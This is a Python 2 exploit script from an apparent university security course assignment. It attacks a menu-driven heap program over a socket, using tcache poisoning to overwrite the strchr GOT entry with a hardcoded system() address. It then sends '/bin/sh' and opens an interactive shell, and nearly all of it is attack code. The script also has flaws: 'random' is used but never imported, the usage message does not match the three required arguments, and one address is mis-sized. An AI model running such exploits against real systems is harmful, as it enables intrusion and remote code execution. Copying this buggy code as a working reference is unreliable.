#!~/anaconda3/envs/CS4678/bin/python
# Nicholas Villemez
# Assignment 4

import struct
import socket
import sys
import time
import binascii
import os
import math
import md5
import re
import hashlib
import telnetlib
import base64

alphanum = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

def rnd_string(sz):
   res = ''
   for i in xrange(sz):
      res += alphanum[random.randrange(0, len(alphanum))]
   return res

def p(f, *args):
   return struct.pack(f, *args)

def u(f, v):
   return struct.unpack(f, v)

def hx(s):
   return binascii.hexlify(s)
   
def ux(s):
   return binascii.unhexlify(s)

def readUntil(s, content, echo = True):
   x = ""
   while True:
      y = s.recv(1)
      if not y:
         return False
      x += y
      for v in content:
         if x.endswith(v):
            if echo:
               sys.stderr.write(x)
            return x

def ru(s, txt):
   return readUntil(s, [txt])

def interact(s):
   t = telnetlib.Telnet()                                                            
   t.sock = s                                                                        
   t.interact() 

if len(sys.argv) != 4:
   print "usage: python prog.py <ip> <port>"
   sys.exit(0)

tgthost = sys.argv[1]
tgtport = int(sys.argv[2])
mode = sys.argv[3]

target = (tgthost, tgtport)

s = socket.socket()
s.connect(target)


#DO THE FUN STUFF HERE

# assign 4 a

raw_input("debug now")
print("In mode " + mode)
if mode == 'a':
    add_items = "1\n10\n" + "A" * 10 + "\n" "1\n10\n" + "B" * 10 + "\n"

    free_item = "2\n" + "B" * 10 + "\n"

    edit_item = "4\n" +  "A" * 10 + "\n"

    # 0x602050 is address of strchr GOT entry that we want to overwrite
    # 2 8 byte pointers and 8 bytes from malloc mean we want to aim for address 0x602050 - 0x10 = 602040

    # First item is stored at 0x603270, need to overwrite tcache pointer created at 0x603290
    # 32 byte difference between the two addresses

    strchr_address = '\x40\x20\x60\x00\x00\x00\x00\x00'

    # might need to zero out pointer after address "\x00" * 8
    # May have to put a size in the spot with A's
    got_overwrite = "A" * 24 + "\x31" + "\x00" * 7 + strchr_address + "\n"
    #got_overwrite = "A" * 32 + strchr_address + "\n"

    # Now that we have the GOT address stored in the tcache pointer location
    # we need to overwrite the data at that location with the call to system, located at 0x7ffff7a31550

    # Add new item to iterate through tcache pointer
    add_second_item = "1\n10\n" + "C" * 10 + "\n"

    # Add system address to overwrite got table entry
    system_address = '\x50\x15\xa3\xf7\xff\x7f\x00\x00\x00\x00'
    add_system = "1\n10\n" + system_address + "\n"

    #call edit on strchr to activate system call and pass argument /bin/sh to open shell
    open_shell = "4\n" + "/bin/sh" + "\n"

    payload = add_items + free_item + edit_item + got_overwrite + add_second_item + add_system + open_shell

    f = open("payloada.txt", "w")
    f.write(payload)
    f.close()

# Assign 4 b
elif mode == 'b':
    add_items = "1\n10\n" + "A" * 10 + "\n" "1\n10\n" + "B" * 10 + "\n"

    free_item = "2\n" + "B" * 10 + "\n"

    edit_item = "4\n" +  "A" * 10 + "\n"

    # 0x602048 is address of strchr GOT entry that we want to overwrite
    # 2 8 byte pointers and 8 bytes from malloc mean we want to aim for address 0x602048 - 0x10 = 602038

    # First item is stored at 0x603270, need to overwrite tcache pointer created at 0x603290
    # 32 byte difference between the two addresses

    strchr_address = '\x38\x20\x60\x00\x00\x00\x00\x00'

    # might need to zero out pointer after address "\x00" * 8
    # May have to put a size in the spot with A's
    got_overwrite = "A" * 24 + "\x31" + "\x00" * 7 + strchr_address + "\n"
    #got_overwrite = "A" * 32 + strchr_address + "\n"

    # Now that we have the GOT address stored in the tcache pointer location
    # we need to overwrite the data at that location with the call to system, located at 0x7ffff7a31550

    # Add new item to iterate through tcache pointer
    add_second_item = "1\n10\n" + "C" * 10 + "\n"

    # Add system address to overwrite got table entry
    system_address = '\x50\x15\xa3\xf7\xff\x7f\x00\x00'
    add_system = "1\n10\n" + system_address + "\n"
    # break _fgets+112
    #call edit on strchr to activate system call and pass argument /bin/sh to open shell
    open_shell = "4\n" + "/bin/sh" + "\n"

    payload = add_items + free_item + edit_item + got_overwrite + add_second_item + add_system + open_shell

    f = open("payloadb.txt", "w")
    f.write(payload)
    f.close()

else:
    print("Please select from mode a or b")


s.send(payload)

# Once you have a shell on some socket s, maybe that's the
# same socket at above, maybe it's a new socket, then interact
# will use telnetlib to handle the asynchronous I/O needed to 
# interact with your shell

interact(s)
